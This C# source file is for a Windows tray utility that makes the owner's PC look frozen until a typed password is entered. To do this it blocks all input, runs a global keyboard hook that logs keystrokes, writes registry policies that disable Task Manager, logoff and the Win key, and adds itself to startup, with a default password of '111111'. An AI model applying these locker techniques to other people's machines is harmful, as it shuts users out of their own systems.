using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Threading;

namespace FakeFreezeApp
{
    public partial class MainForm : Form
    {
        #region Windows API/常量声明

        // 阻塞鼠标、键盘输入
        [DllImport("user32.dll")]
        public static extern bool BlockInput(bool block);

        // 安装/卸载全局键盘钩子
        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        // 获取当前模块句柄
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // 设置线程执行状态，防止待机关屏
        [DllImport("kernel32.dll")]
        static extern uint SetThreadExecutionState(uint esFlags);

        // 注册/取消注册会话更改消息(监听锁屏/解锁)
        [DllImport("wtsapi32.dll", SetLastError = true)]
        public static extern bool WTSRegisterSessionNotification(IntPtr hWnd, int dwFlags);

        [DllImport("wtsapi32.dll", SetLastError = true)]
        public static extern bool WTSUnRegisterSessionNotification(IntPtr hWnd);

        // 常量定义
        private const int NOTIFY_FOR_THIS_SESSION = 0;
        private const uint ES_CONTINUOUS = 0x80000000;
        private const uint ES_DISPLAY_REQUIRED = 0x00000002;
        private const uint ES_SYSTEM_REQUIRED = 0x00000001;

        // 键盘钩子回调
        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static HookProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        // 解锁相关
        private static readonly StringBuilder inputBuffer = new StringBuilder();
        private static string unlockPassword = "111111";
        private static bool isUnlocked = false;

        // 应用标识 & 主窗口引用
        private const string appName = "FakeFreezeApp";
        private static MainForm instance;

        // 定时器，用于维持假死状态
        private static System.Threading.Timer keepBlockingTimer;

        #endregion

        #region 构造函数 & 事件

        public MainForm()
        {
            InitializeComponent();
            instance = this;

            // 初始化托盘图标、菜单
            InitializeTrayIcon();

            // 1) 在构造函数里读取是否"开启即锁定"
            bool autoLockOnStartup = LoadAutoLockOnStartupFromRegistry();
            if (autoLockOnStartup)
            {
                // 2) 若为true，则立即启动假死
                StartFakeFreeze();
            }
        }

        private async void MainForm_Load(object sender, EventArgs e)
        {
            // 隐藏主窗体
            this.Hide();
            this.ShowInTaskbar = false;
            this.WindowState = FormWindowState.Minimized;

            // 注册会话更改消息
            WTSRegisterSessionNotification(this.Handle, NOTIFY_FOR_THIS_SESSION);

            // 读取解锁密码（如果存在）
            LoadPasswordFromRegistry();

            // 可以根据需要稍作延迟
            await Task.Delay(500);
        }

        private void MainForm_FormClosed(object sender, FormClosedEventArgs e)
        {
            // 退出时停止假死
            StopFakeFreeze();
            // 注销会话更改事件
            WTSUnRegisterSessionNotification(this.Handle);
        }

        #endregion

        #region 注册表操作：解锁密码 & AutoLockOnStartup

        /// <summary>
        /// 读取解锁密码
        /// </summary>
        private void LoadPasswordFromRegistry()
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\" + appName + @"\Settings"))
                {
                    if (key != null)
                    {
                        object value = key.GetValue("UnlockPassword");
                        if (value != null) unlockPassword = value.ToString();
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("读取密码失败：" + ex.Message);
            }
        }

        /// <summary>
        /// 保存解锁密码
        /// </summary>
        private void SavePasswordToRegistry(string password)
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\" + appName + @"\Settings"))
                {
                    key.SetValue("UnlockPassword", password, RegistryValueKind.String);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("保存密码失败：" + ex.Message);
            }
        }

        /// <summary>
        /// 读取"是否开启即锁定"配置
        /// </summary>
        private bool LoadAutoLockOnStartupFromRegistry()
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\" + appName + @"\Settings"))
                {
                    if (key != null)
                    {
                        object value = key.GetValue("AutoLockOnStartup");
                        if (value != null)
                        {
                            return (value.ToString() == "1");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("读取自动锁定失败：" + ex.Message);
            }
            // 默认为 false
            return false;
        }

        /// <summary>
        /// 保存"是否开启即锁定"配置
        /// </summary>
        private void SaveAutoLockOnStartupToRegistry(bool enable)
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\" + appName + @"\Settings"))
                {
                    key.SetValue("AutoLockOnStartup", enable ? "1" : "0", RegistryValueKind.String);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("保存自动锁定失败：" + ex.Message);
            }
        }

        #endregion

        #region 托盘图标与菜单
        private void InitializeTrayIcon()
        {
            notifyIconApp.Icon = new Icon("shield.ico"); // 加载自定义图标
            notifyIconApp.Text = "蹲坑守护";
            notifyIconApp.Visible = true;

            notifyIconApp.MouseClick += NotifyIconApp_MouseClick;

            ContextMenuStrip menu = new ContextMenuStrip();

            // "启动守护"：手动启动假死
            var menuItemStart = new ToolStripMenuItem("启动守护");
            menuItemStart.Click += menuItemStart_Click;
            menu.Items.Add(menuItemStart);

            // "配置密码"
            var menuItemConfig = new ToolStripMenuItem("配置密码");
            menuItemConfig.Click += menuItemConfig_Click;
            menu.Items.Add(menuItemConfig);

            // "开启即锁定"
            var menuItemAutoLock = new ToolStripMenuItem("开启即锁定");
            bool autoLock = LoadAutoLockOnStartupFromRegistry();
            menuItemAutoLock.Checked = autoLock;
            menuItemAutoLock.Click += (s, e) =>
            {
                bool newVal = !menuItemAutoLock.Checked;
                menuItemAutoLock.Checked = newVal;
                SaveAutoLockOnStartupToRegistry(newVal);

                MessageBox.Show(newVal ?
                    "下次启动将自动锁定" :
                    "下次启动不再自动锁定");
            };
            menu.Items.Add(menuItemAutoLock);

            // "开机启动"
            var menuItemStartup = new ToolStripMenuItem("开机启动");
            menuItemStartup.Click += menuItemStartup_Click;
            menu.Items.Add(menuItemStartup);

            // "退出"
            var menuItemExit = new ToolStripMenuItem("退出");
            menuItemExit.Click += menuItemExit_Click;
            menu.Items.Add(menuItemExit);

            notifyIconApp.ContextMenuStrip = menu;

            // 检查并显示"开机启动"是否已勾选
            CheckStartupStatus(menuItemStartup);
        }

        // 点击"启动守护"
        private void menuItemStart_Click(object sender, EventArgs e)
        {
            StartFakeFreeze();
            ShowAutoCloseMessageBox("已启动守护模式！", "提示", 500);
        }

        // 通过左键点击托盘"启动守护"
        private async void NotifyIconApp_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                // 等待2秒
                await Task.Delay(2000);
                // 如果是左键点击托盘图标，则锁定
                StartFakeFreeze();
                ShowAutoCloseMessageBox("已启动守护模式！", "提示", 500);
                //ShowAutoCloseMessageBox("已通过左键点击托盘启动守护模式！", "提示", 500);
            }
        }

        // 点击"配置密码"
        private void menuItemConfig_Click(object sender, EventArgs e)
        {
            string newPassword = Microsoft.VisualBasic.Interaction.InputBox(
                "请输入新的解锁密码：",
                "配置密码",
                unlockPassword);

            if (!string.IsNullOrEmpty(newPassword))
            {
                unlockPassword = newPassword;
                SavePasswordToRegistry(newPassword);
                MessageBox.Show("密码已更新！");
            }
        }

        // 点击"开机启动"
        private void menuItemStartup_Click(object sender, EventArgs e)
        {
            try
            {
                var key = Registry.CurrentUser.OpenSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Run", true);

                if (key == null)
                {
                    MessageBox.Show("无法打开注册表，请检查权限。");
                    return;
                }

                if (key.GetValue(appName) == null)
                {
                    key.SetValue(appName, Application.ExecutablePath);
                    MessageBox.Show("已成功设置为开机启动！");
                }
                else
                {
                    key.DeleteValue(appName);
                    MessageBox.Show("已取消开机启动！");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("开机启动设置失败: " + ex.Message);
            }
        }

        // 点击"退出"
        private void menuItemExit_Click(object sender, EventArgs e)
        {
            StopFakeFreeze();
            Application.Exit();
        }

        // 根据注册表判断"开机启动"是否勾选
        private void CheckStartupStatus(ToolStripMenuItem startupMenuItem)
        {
            var key = Registry.CurrentUser.OpenSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Run", false);

            if (key != null && key.GetValue(appName) != null)
            {
                startupMenuItem.Checked = true;
            }
            else
            {
                startupMenuItem.Checked = false;
            }
        }

        #endregion

        #region 假死控制(开始/停止)与定时器

        private static void StartFakeFreeze()
        {
            lock (inputBuffer)
            {
                inputBuffer.Clear();
            }
            isUnlocked = false;

            // 阻塞输入
            BlockInput(true);

            // 防止系统待机
            SetThreadExecutionState(ES_CONTINUOUS | ES_DISPLAY_REQUIRED | ES_SYSTEM_REQUIRED);

            // 安装键盘钩子
            HookKeyboard();

            // 禁用任务管理器、Ctrl+Alt+Del、Win键
            DisableTaskManager();
            DisableCtrlAltDel();
            DisableWinKey();

            // 启动定时器，持续维持假死
            StartKeepBlockingTimer();
        }

        private static void StopFakeFreeze()
        {
            StopKeepBlockingTimer();

            BlockInput(false);

            if (_hookID != IntPtr.Zero)
            {
                UnhookWindowsHookEx(_hookID);
                _hookID = IntPtr.Zero;
            }

            SetThreadExecutionState(ES_CONTINUOUS);

            EnableTaskManager();
            EnableCtrlAltDel();
            EnableWinKey();
        }

        private static void StartKeepBlockingTimer()
        {
            StopKeepBlockingTimer();
            keepBlockingTimer = new System.Threading.Timer(KeepBlockingCallback, null, 0, 500);
        }

        private static void StopKeepBlockingTimer()
        {
            if (keepBlockingTimer != null)
            {
                keepBlockingTimer.Dispose();
                keepBlockingTimer = null;
            }
        }

        private static void KeepBlockingCallback(object state)
        {
            if (!isUnlocked)
            {
                BlockInput(true);

                // 如果钩子丢失就重新安装
                if (_hookID == IntPtr.Zero)
                {
                    HookKeyboard();
                }
            }
            else
            {
                // 解锁后停止定时
                StopKeepBlockingTimer();
            }
        }

        #endregion

        #region 键盘钩子

        private static void HookKeyboard()
        {
            _hookID = SetWindowsHookEx(13, _proc, GetModuleHandle(null), 0);
            if (_hookID == IntPtr.Zero)
            {
                MessageBox.Show("键盘钩子安装失败，请以管理员权限运行！");
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            // WM_KEYDOWN = 0x100
            if (nCode >= 0 && (int)wParam == 0x100)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                char pressedChar = (char)vkCode;

                lock (inputBuffer)
                {
                    inputBuffer.Append(pressedChar);
                    Console.WriteLine($"当前输入: {inputBuffer}");

                    // 检测解锁密码
                    if (!isUnlocked &&
                        inputBuffer.ToString().ToLower().Contains(unlockPassword.ToLower()))
                    {
                        isUnlocked = true;
                        StopFakeFreeze();
                        inputBuffer.Clear();

                        // 拦截此按键，避免最后字符"漏"到前台
                        return (IntPtr)1;
                    }

                    // 防止无限增长
                    if (inputBuffer.Length > unlockPassword.Length)
                    {
                        inputBuffer.Clear();
                    }
                }
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        #endregion

        #region 禁用/启用 任务管理器、Ctrl+Alt+Del、Win键

        private static void DisableTaskManager()
        {
            try
            {
                var key = Registry.CurrentUser.OpenSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);

                if (key == null)
                {
                    key = Registry.CurrentUser.CreateSubKey(
                        @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                }

                key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                key.Close();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"禁用任务管理器失败: {ex.Message}");
            }
        }

        private static void EnableTaskManager()
        {
            try
            {
                var key = Registry.CurrentUser.OpenSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);

                if (key != null)
                {
                    key.DeleteValue("DisableTaskMgr", false);
                    key.Close();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"启用任务管理器失败: {ex.Message}");
            }
        }

        private static void DisableCtrlAltDel()
        {
            try
            {
                var key = Registry.LocalMachine.OpenSubKey(
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true);

                if (key == null)
                {
                    key = Registry.LocalMachine.CreateSubKey(
                        @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                }

                key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                key.SetValue("DisableChangePassword", 1, RegistryValueKind.DWord);
                key.SetValue("DisableLockWorkstation", 1, RegistryValueKind.DWord);
                key.SetValue("DisableLogoff", 1, RegistryValueKind.DWord);

                key.Close();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"禁用 Ctrl + Alt + Del 失败: {ex.Message}");
            }
        }

        private static void EnableCtrlAltDel()
        {
            try
            {
                var key = Registry.LocalMachine.OpenSubKey(
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true);

                if (key != null)
                {
                    key.DeleteValue("DisableTaskMgr", false);
                    key.DeleteValue("DisableChangePassword", false);
                    key.DeleteValue("DisableLockWorkstation", false);
                    key.DeleteValue("DisableLogoff", false);
                    key.Close();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"启用 Ctrl + Alt + Del 失败: {ex.Message}");
            }
        }

        private static void DisableWinKey()
        {
            try
            {
                var key = Registry.CurrentUser.CreateSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");

                key.SetValue("NoWinKeys", 1, RegistryValueKind.DWord);
                key.Close();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"禁用 Win 键失败: {ex.Message}");
            }
        }

        private static void EnableWinKey()
        {
            try
            {
                var key = Registry.CurrentUser.CreateSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                key.DeleteValue("NoWinKeys", false);
                key.Close();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"启用 Win 键失败: {ex.Message}");
            }
        }

        #endregion

        #region 自动关闭消息框

        private void ShowAutoCloseMessageBox(string message, string title, int duration)
        {
            Task.Run(() =>
            {
                this.Invoke(new Action(() =>
                {
                    var thread = new Thread(() =>
                    {
                        MessageBox.Show(message, title, MessageBoxButtons.OK);
                    });

                    thread.SetApartmentState(ApartmentState.STA);
                    thread.Start();

                    Task.Delay(duration).ContinueWith(t =>
                    {
                        if (thread.IsAlive)
                        {
                            this.Invoke(new Action(() => SendKeys.SendWait("{ENTER}")));
                        }
                    });
                }));
            });
        }

        #endregion

        #region 会话切换（锁屏/解锁）
        protected override void WndProc(ref Message m)
        {
            const int WM_WTSSESSION_CHANGE = 0x02B1;
            const int WTS_SESSION_LOCK = 0x7; // 用户锁屏
            const int WTS_SESSION_UNLOCK = 0x8; // 用户解锁

            base.WndProc(ref m);

            if (m.Msg == WM_WTSSESSION_CHANGE)
            {
                int eventId = m.WParam.ToInt32();

                if (eventId == WTS_SESSION_LOCK)
                {
                    // 用户锁屏时停止假死
                    StopFakeFreeze();
                }
                else if (eventId == WTS_SESSION_UNLOCK)
                {
                    // 解锁后，如未解锁，则再次启动假死
                    if (!isUnlocked)
                    {
                        StartFakeFreeze();
                    }
                }
            }
        }
        #endregion
    }
}
